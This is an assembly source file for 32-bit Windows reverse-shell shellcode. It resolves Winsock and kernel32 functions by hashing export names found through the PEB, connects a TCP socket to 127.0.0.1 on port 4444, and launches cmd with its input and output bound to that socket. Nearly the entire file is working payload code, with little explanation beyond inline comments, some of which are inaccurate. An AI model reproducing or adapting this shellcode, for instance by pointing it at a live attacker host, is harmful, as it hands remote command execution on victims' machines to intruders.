; Shellcode for reverse shell to 127.0.0.1:4444
[BITS 32]
mainentrypoint:
call geteip
geteip:
pop edx ; EDX is now base for function
lea edx, [edx-5] ;adjust for first instruction?
mov ebp, esp
sub esp, 1000h

; Find WS2_32 functions
push edx ; save current location
mov ebx, 0xd6bc4bcc ; ws2_32.dll hash
call get_module_address
pop edx ; restore current location
push ebp ; save stacker pointer
push edx ; save current location
mov ebp, eax ; move address of ws2_32 into ebp
lea esi, [EDX + WS2_32HASHTABLE]        ; load hash table into esi
lea edi, [EDX + WS2_32FUNCTIONSTABLE]   ; load function table into edi
call get_api_address					; after this function edi has function addresses from ws2_32
pop edx   ; restore location
pop ebp   ; restore stack pionter
; Find Kernel32 functions
push edx			; save current location
mov ebx, 0x4b1ffe8e ; kernel32.dll
call get_module_address
pop edx				; restore location
push ebp			; save base pointer
push edx			; save location
mov ebp, eax		; move address of kernel32 into ebp
lea esi, [EDX + KERNEL32HASHTABLE]		;load hash table into esi
lea edi, [EDX + KERNEL32FUNCTIONSTABLE]	;load function table into edi
call get_api_address	; edi has function addresses from kernel32
pop edx				; restore location
pop ebp				; restore base pointer


push ebp
push edx
;call WSASocketA(2,1,6,0,0,0)
xor ebx, ebx  	; set ebx to 0
push ebx      	;dwFlags
push ebx      	;g
push ebx      	;lpProtocolInfo
xor ecx, ecx  	; set ecx to 0
mov cl, 6		; set cl to 6
push ecx		; protocol / IPPROTO_TCP
inc ebx			; ebx = 1
push ebx		; type / SOCK_STREAM
inc ebx			; ebx = 2
push ebx		; af / AF_INET
mov eax, [EDX + WSASocketA] ; address of WSASocketA into eax
call eax
xchg eax,esi	; move socket pointer into esi
pop edx
pop ebp

push ebp
push edx
; call WSAConnectA(s, sockaddr, sizeof(sockaddr), 0, 0, 0, 0)
push 0x0100007f 	; 127.0.0.1
push word 0x5c11	; 0x115c = port 4444
xor eax, eax		; eax = 0
add al, 2			; bl = 2 / sa_family / AF_INET
push word ax		; push sa_family onto stack
mov eax, esp		; eax = sockaddr
xor ecx, ecx		; ecx = 0
push ecx			; lpGQOS
push ecx			; lpSQOS
push ecx			; lpCalleeData
push ecx			; lpCallerData
push byte 16		; namelen
push eax			; sockaddr
push esi			; s
mov eax, [EDX + WSAConnect] ; address of WSAConnectA into ebx
call eax			; after this, socket at esi is connected
add esp,8			; clean up sa_family from stack
pop edx
pop ebp

push ebp
push edx
; Setting up lpStartupInfo and lpProcessInfo
mov ebx, 0x646d6363	; ccmd
shr ebx, 8			; cmd
push ebx			; cmd on stack
mov edi, esp		; pointer to cmd in edi
xor ebx, ebx		; ebx = 0
sub esp, 16			; grow stack by 16
mov ebx, esp		; PROCESS_INFORMATION structure into ebx
push esi			; hStdError / socket
push esi			; hStdOut / socket
push esi			; hStdIn / socket
xor ecx, ecx		; ecx = 0
push ecx			; lpReserved2
push ecx			; cbReserved2
inc ecx				; ecx = 1
rol ecx, 8			; ecx = 256 / 0x100
push ecx			; dwFlags START_USESTDHANDLES
xor ecx,ecx			; ecx = 0
push ecx			; dwFillAttribute - NULL
push ecx			; dwYCountChars - NULL
push ecx			; dwXCountChars - NULL
push ecx			; dwYSize - NULL
push ecx			; dwXSize - NULL
push ecx			; dwY - NULL
push ecx			; dwX - NULL
push ecx			; pTitle - NULL
push ecx			; pDesktop - NULL
push ecx			; pReserved - NULL
add cl, 44			; cl = 44
push ecx			; cb
mov ecx, esp		; STARTUP_INFO into ecx
;CreateProcessA(null, 'cmd', null, null, true, 0, null, null, &sui, &pi)
push ebx		; lpProcessInfo
push ecx		; lpStartupInfo
xor eax, eax	; eax = 0
push eax		; lpCurrentDirectory
push eax		; lpEnvironment
push eax		; dwCreationFlags
inc eax			; eax = 1
push eax		; bInheritHandles = True
dec eax			; eax = 0
push eax		; lpThreadAttributes
push eax		; lpProcessAttributes
push edi		; lpCommandLine
push eax		; lpApplicationName
mov ebx, [edx + CreateProcessA]
call ebx
pop edx
pop ebp

; returns module base in EAX
; EBP = Hash of desired module
get_module_address:
;walk PEB find target module
cld
xor edi, edi
mov edi, [FS:0x30]
mov edi, [edi+0xC]
mov edi, [edi+0x14]
next_module_loop:
mov esi, [edi+0x28]
xor edx, edx
module_hash_loop:
lodsw
test al, al
jz end_module_hash_loop
cmp al, 0x41
jb end_hash_check
cmp al, 0x5A
ja end_hash_check
or al, 0x20
end_hash_check:
rol edx, 7
xor dl, al
jmp module_hash_loop
end_module_hash_loop:

cmp edx, ebx
mov eax, [edi+0x10]
mov edi, [edi]
jnz next_module_loop

ret

get_api_address:
mov edx, ebp
add edx, [edx+3Ch]
mov edx, [edx+78h]
add edx, ebp
mov ebx, [edx+20h]
add ebx, ebp
xor ecx, ecx

load_api_hash:
push edi
push esi
mov esi, [esi]

load_api_name:
mov edi, [ebx]
add edi, ebp
push edx
xor edx, edx

create_hash_loop:
rol edx, 7
xor dl, [edi]
inc edi
cmp byte [edi], 0
jnz create_hash_loop

xchg eax, edx
pop edx
cmp eax, esi
jz load_api_addy
add ebx, 4
inc ecx
cmp [edx+18h], ecx
jnz load_api_name
pop esi
pop edi
ret

load_api_addy:
pop esi
pop edi
lodsd
push esi
push ebx
mov ebx, ebp
mov esi, ebx
add ebx, [edx+24h]
lea eax, [ebx+ecx*2]
movzx eax, word [eax]
lea eax, [esi+eax*4]
add eax, [edx+1ch]
mov eax, [eax]
add eax, esi
stosd
pop ebx
pop esi
add ebx, 4
inc ecx
cmp dword [esi], 0FFFFh
jnz load_api_hash

ret

KERNEL32HASHTABLE:
	dd 0x46318ac7 ; creatprocessA
	dd 0x95902b19 ; exitprocess
	dd 0xFFFF ; make sure to end with this token

KERNEL32FUNCTIONSTABLE:
CreateProcessA:
	dd 0x00000001
ExitProcess:
	dd 0x00000002

WS2_32HASHTABLE:
	dd 0x3e5a7ea1 ;WSAConnect
	dd 0xeefa3514 ;WSASocketA
	dd 0xFFFF ; make sure to end with this token

WS2_32FUNCTIONSTABLE:
WSAConnect:
	dd 0x00000001
WSASocketA:
	dd 0x00000002
